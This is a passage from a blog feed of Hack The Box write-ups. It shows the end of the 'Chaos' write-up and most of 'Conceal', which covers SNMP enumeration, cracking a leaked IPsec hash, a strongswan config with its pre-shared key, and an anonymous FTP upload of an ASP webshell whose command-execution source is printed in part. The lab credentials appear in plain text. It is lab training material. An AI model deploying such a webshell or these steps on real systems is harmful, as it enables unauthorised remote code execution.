&lt;h4 id=&quot;we-owned-root-&quot;&gt;We owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---conceal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/conceal/&quot;&gt;Hack The Box - Conceal&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="rbash" /><category term="LaTeX injection" /><category term="Wordpress" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Chaos retired and here’s my write-up about it. Chaos was a CTF-style machine, I can’t say that it simulated a real life situation. I had fun solving this box, some steps were straightforward others were very tricky. About main steps, To get an initial shell as www-data we will exploit a web application that used LaTeX. After that we will escalate privileges to another user and escape rbash. For root privilege escalation we will extract root credentials from a firefox profile and get a root shell. It’s a Linux box and its ip is 10.10.10.120, I added it to /etc/hosts as chaos.htb. Let’s jump right in. Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC chaos.htb We got some ports. http on port 80 and 10000, email related services (imap, pop3) running on ports 110, 143, 993 and 995. Let’s check http. HTTP Initial Enumeration Port 10000 gave me this error : So I switched to https and got a login form : We don’t have any credentials and I ran gobuster and got nothing interesting so we will ignore this and look at port 80. It’s just a normal website, rest of it : I checked that contact form and it’s doing nothing. I ran gobuster on chaos.htb and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://chaos.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:36:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /javascript (Status: 301) /js (Status: 301) /server-status (Status: 403) /source (Status: 301) ===================================================== 2019/05/24 14:40:36 Finished ===================================================== And now this part is tricky. Because going to the ip of the box 10.10.10.120 instead of chaos.htb will give us a different thing (virtual hosting). It’s saying Direct IP not allowed. I ran another gobuster scan on the ip and got different results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.120/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/05/24 14:41:52 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /wp (Status: 301) ===================================================== 2019/05/24 14:45:37 Finished ===================================================== On chaos.htb the thing the caught my attention was /source so I checked that and it didn’t have anything : I checked http://10.10.10.120/wp and found a wordpress website : I looked at the posts, there was only one post and it was password protected : I clicked on the post link and saw that the author of the post is called human : Before trying to bruteforce the password I tried some basic stuff first and the username:username type of credentials worked. The password was human : And we got some credentials for mail : ayush:jiujitsu Accessing the e-mail Service, Decrypting Secret Message We saw earlier some email services running on the machine. Now we have credentials to access these services. To do that we will use an email client, I used claws-mail (can be installed with apt) and configured it like this : Inbox was empty but drafts had something : ``` From: ayush ayush@localhost To: undisclosed-recipients:; Subject: service Date: Sun, 28 Oct 2018 17:46:38 +0530 User-Agent: Roundcube Webmail/1.3.8</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/chaos/0.png" /></entry><entry><title type="html">Hack The Box - Conceal</title><link href="http://localhost:4000/hack-the-box/conceal/" rel="alternate" type="text/html" title="Hack The Box - Conceal" /><published>2019-05-18T00:00:00+02:00</published><updated>2019-05-18T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/conceal</id><content type="html" xml:base="http://localhost:4000/hack-the-box/conceal/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-conceal-retired-and-heres-my-write-up-about-it-conceal-was-a-straightforward-fun-box-the-only-tricky-part-about-it-is-gaining-ipsec-connection-to-gain-access-to-some-filtered-services-that-first-part-involved-some-guessing-but-after-that-everything-is-simple-and-very-straightforward-i-liked-this-machine-and-it-was-a-very-fun-one-its-a-windows-machine-and-its-ip-is-101010116-i-added-it-to-etchosts-as-concealhtb-lets-jump-right-in&quot;&gt;Hey guys today Conceal retired and here’s my write-up about it. Conceal was a straightforward fun box, The only tricky part about it is gaining &lt;a href=&quot;https://en.wikipedia.org/wiki/IPsec&quot;&gt;IPSEC&lt;/a&gt; connection to gain access to some filtered services. That first part involved some guessing but after that everything is simple and very straightforward. I liked this machine and it was a very fun one. It’s a windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.116&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;conceal.htb&lt;/code&gt;. Let’s jump right in.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-got-nothing-&quot;&gt;And we got nothing !&lt;/h4&gt;
&lt;h4 id=&quot;i-ran-another-nmap-udp-scan-on-all-ports-&quot;&gt;I ran another &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; UDP scan on all ports :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -vvv -sU -o nmapudp conceal.htb --max-retries 0&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-too-long-so-i-will-show-the-only-important-part-&quot;&gt;The output was too long so I will show the only important part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/conceal/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-was-not-sure-about-port-161-but-it-showed-that-port-500-is-open&quot;&gt;It was not sure about port 161, but it showed that port 500 is open.&lt;/h4&gt;
&lt;h4 id=&quot;i-ran-a-third-scan-on-ports-500-and-161-&quot;&gt;I ran a third scan on ports 500 and 161 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -p 161,500 -sV -sU -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;full-output-&quot;&gt;Full Output :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Nmap 7.70 scan initiated Fri May 17 16:37:52 2019 as: nmap -p 161,500 -sV -sU -sC -o nmapudp2 conceal.htb
Nmap scan report for conceal.htb (10.10.10.116)
Host is up (0.20s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   Intel(R) 82574L Gigabit Network Connection\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|     Traffic stats: 399.03 Kb sent, 6.41 Mb received
|   Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:55:a7 (VMware)
|     Type: ethernetCsmacd  Speed: 1 Gbps
|_    Traffic stats: 399.03 Kb sent, 6.41 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:65496   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:65497      *:*
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   308: 
|     Name: smss.exe
|   348: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   392: 
|     Name: csrss.exe
|   468: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   472: 
|     Name: wininit.exe
|   484: 
|     Name: csrss.exe
|   564: 
|     Name: winlogon.exe
|   584: 
|     Name: services.exe
|   616: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   696: 
|     Name: fontdrvhost.exe
|   704: 
|     Name: fontdrvhost.exe
|   712: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   812: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   900: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   908: 
|     Name: dwm.exe
|   940: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   976: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   984: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   1140: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1232: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1248: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   1292: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa3a2c855 /state1:0x41c64e6d
|   1392: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1400: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1492: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1728: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1748: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1788: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1856: 
|     Name: SecurityHealthService.exe
|   1868: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1892: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1912: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1932: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1956: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1980: 
|     Name: MsMpEng.exe
|   2068: 
|     Name: Memory Compression
|   2204: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   2444: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2952: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   2976: 
|     Name: NisSrv.exe
|   3052: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3132: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   3280: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   3376: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   3948: 
|     Name: svchost.exe
|   5004: 
|     Name: SearchFilterHost.exe
|     Path: C:\Windows\system32\
|     Params:  0 700 704 712 8192 708 
|   5032: 
|     Name: SearchProtocolHost.exe
|     Path: C:\Windows\system32\
|_    Params:  Global\UsGthrFltPipeMssGthrPipe23_ Global\UsGthrCtrlFltPipeMssGthrPipe23 1 -2147483646 &quot;Software\Microsoft\Windows Search&quot; &quot;Moz
| snmp-sysdescr: Hardware: Intel64 Family 6 Model 79 Stepping 1 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 2h08m26.61s (770661 timeticks)
| snmp-win32-services: 
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Client License Service (ClipSVC)
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft Account Sign-in Assistant
|   Microsoft FTP Service
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Tile Data model server
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Workstation
|_  World Wide Web Publishing Service
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2018-10-12T20:10:30
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2018-10-12T20:10:22
|_  VMware Tools; 2018-10-12T20:11:02
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
500/udp open  isakmp  Microsoft Windows 8
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 17 16:42:05 2019 -- 1 IP address (1 host up) scanned in 253.58 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-have-two-services-to-enumerate-isakmp-which-is-ipsec-and-snmp&quot;&gt;We have two services to enumerate. &lt;code class=&quot;highlighter-rouge&quot;&gt;isakmp&lt;/code&gt; which is &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;snmp&lt;/code&gt;.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;i-started-with-snmpwalk-&quot;&gt;I started with &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 conceal.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-output-was-very-long-but-we-only-need-this-first-part-&quot;&gt;The output was very long but we only need this first part :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-have-a-password-hash-for-the-ipsec-connection--9c8b1a372b1878851be2c097031b6e43&quot;&gt;We have a password hash for the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection : &lt;code class=&quot;highlighter-rouge&quot;&gt;9C8B1A372B1878851BE2C097031B6E43&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;i-used-crackstation-to-crack-it-and-i-got-this-result-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack it and I got this result :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--now-we-need-to-enumerate-the-ike-vpn-service-to-know-how-to-connect-to-it&quot;&gt;Great ! Now we need to enumerate the &lt;code class=&quot;highlighter-rouge&quot;&gt;ike&lt;/code&gt; vpn service to know how to connect to it.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ike-scan-setting-up-the-connection&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt;, Setting up The Connection&lt;/h3&gt;
&lt;h4 id=&quot;i-ran-ike-scan-and-got-these-results-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and got these results :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-installed-strongswan-to-set-up-the-ipsec-connection-with-the-help-of-the-info-i-got-from-ike-scan-and-some-guessing-i-could-come-up-with-this-configuration-which-worked-&quot;&gt;I installed &lt;code class=&quot;highlighter-rouge&quot;&gt;strongswan&lt;/code&gt; to set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;IPSEC&lt;/code&gt; connection. With the help of the info I got from &lt;code class=&quot;highlighter-rouge&quot;&gt;ike-scan&lt;/code&gt; and some guessing I could come up with this configuration which worked :&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.conf&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/conceal/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conn rick-to-conceal
        authby=secret
        auto=route
        keyexchange=ikev1
        ike=3des-sha1-modp1024
        left=10.10.xx.xx
        right=10.10.10.116
        type=transport
        esp=3des-sha1
        rightprotoport=tcp
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ipsec.secrets&lt;/code&gt; :
&lt;img src=&quot;/images/hackthebox/conceal/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;10.10.xx.xx 10.10.10.116 : PSK &quot;Dudecake1!&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-started-ipsec-then-i-initialized-the-connection-&quot;&gt;I started &lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec&lt;/code&gt; then I initialized the connection :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec start&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ipsec up rick-to-conceal&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-fine-now-we-are-connected-to-a-vpn-network-lets-see-what-new-services-can-we-get&quot;&gt;It worked fine, now we are connected to a vpn network let’s see what new services can we get.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap-second-time&quot;&gt;Nmap (Second Time)&lt;/h3&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC conceal.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/conceal/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-got-ftp-on-port-21--http-on-port-80-and-smb-on-port-445-i-wanted-to-check-ftp-first-and-see-if-i-can-authenticate-anonymously&quot;&gt;We got ftp on port 21 , http on port 80 and smb on port 445. I wanted to check ftp first and see if I can authenticate anonymously.&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;ftp-file-upload-reverse-shell-and-user-flag&quot;&gt;FTP, File Upload, Reverse Shell and User Flag&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-worked-but-there-was-literally-nothing-on-that-ftp-server-i-uploaded-a-test-file-to-check-if-i-have-write-permissions-on-that-ftp-server-and-i-had&quot;&gt;It worked but there was literally nothing on that ftp server. I uploaded a test file to check if I have write permissions on that ftp server and I had.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-checked-the-http-service-and-there-was-only-the-default-iis-page-&quot;&gt;I Checked the http service and there was only the default IIS page :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-ran-gobuster-with-usrsharewordlistsdirbcommontxt-and-got-only-one-directory-called-upload-&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; with &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/wordlists/dirb/common.txt&lt;/code&gt; and got only one directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://conceal.htb/ -w /usr/share/wordlists/dirb/common.txt

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://conceal.htb/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2019/05/17 17:18:57 Starting gobuster
=====================================================
/upload (Status: 301)
=====================================================
2019/05/17 17:28:23 Finished
=====================================================
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-went-to-upload-and-found-my-test-file-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/upload&lt;/code&gt; and found my test file :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;great--i-uploaded-an-asp-shell-to-get-remote-code-execution-&quot;&gt;Great ! I uploaded an &lt;code class=&quot;highlighter-rouge&quot;&gt;asp&lt;/code&gt; shell to get remote code execution :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/conceal/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;shellasp-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;shell.asp&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
--&amp;gt;


&amp;lt;%
Set oScript = Server.CreateObject(&quot;WSCRIPT.SHELL&quot;)
Set oScriptNet = Server.CreateObject(&quot;WSCRIPT.NETWORK&quot;)
Set oFileSys = Server.CreateObject(&quot;Scripting.FileSystemObject&quot;)
Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject(&quot;WScript.Shell&quot;)
    Set objCmdExec = objshell.exec(thecommand)
    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%&amp;gt;


&amp;lt;HTML&amp;gt;
&amp;lt;BODY&amp;gt;
&amp;lt;FORM action=&quot;&quot; method=&quot;GET&quot;&amp;gt;
&amp;lt;input type=&quot;text&quot; name=&quot;cmd&quot; size=45 value=&quot;&amp;lt;%= szCMD %&amp;gt;&quot;&amp;gt;
&amp;lt;input type=&quot;submit&quot; value=&quot;Run&quot;&amp;gt;
&amp;lt;/FORM&amp;gt;
&amp;lt;PRE&amp;gt;
&amp;lt;%= &quot;\\&quot; &amp;amp; oScriptNet.ComputerName &amp;amp; &quot;\&quot; &amp;amp; oScriptNet.UserName %&amp;gt;
&amp;lt;%Response.Write(Request.ServerVariables(&quot;server_name&quot;))%&amp;gt;
&amp;lt;p&amp;gt;
